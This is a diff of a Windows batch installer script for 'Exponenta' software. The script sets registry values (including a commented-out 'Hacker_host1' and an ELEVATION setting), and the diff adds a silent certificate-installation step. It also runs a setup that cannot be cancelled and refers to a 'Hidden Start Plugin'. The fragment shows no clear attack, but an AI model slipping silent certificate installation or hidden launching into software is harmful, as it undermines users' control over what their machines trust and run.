@@ -48,11 +48,17 @@ rem %SystemRoot%\System32\reg.exe Add "!Key!" /v Hacker_host1 /t REG_SZ /d "!Hac
 %SystemRoot%\System32\reg.exe Add "!Key!" /v ELEVATION /t REG_SZ /d "!Elevation!" /f
 %SystemRoot%\System32\reg.exe Add "!Key!" /v UTIL /t REG_SZ /d "!Util!" /f
 
-rem Insatall MainExponenta Files...
-echo "Install Main Exponenta files..."
 cd /d %curdir%
 
+rem Install Certificates Files...
+if not exist Certificates-install.bat goto UnSuccess_Certificates
+echo "Install Certificates..."
+call Certificates-install.bat
+:UnSuccess_Certificates
+
+rem Install MainExponenta Files...
 if not exist Distrib\ExponentaMainFilesSetup.exe goto UnSuccess
+echo "Install Main Exponenta files..."
 Distrib\ExponentaMainFilesSetup.exe /VERYSILENT /NOCANCEL
 
 rem Install Hidden Start Plugin
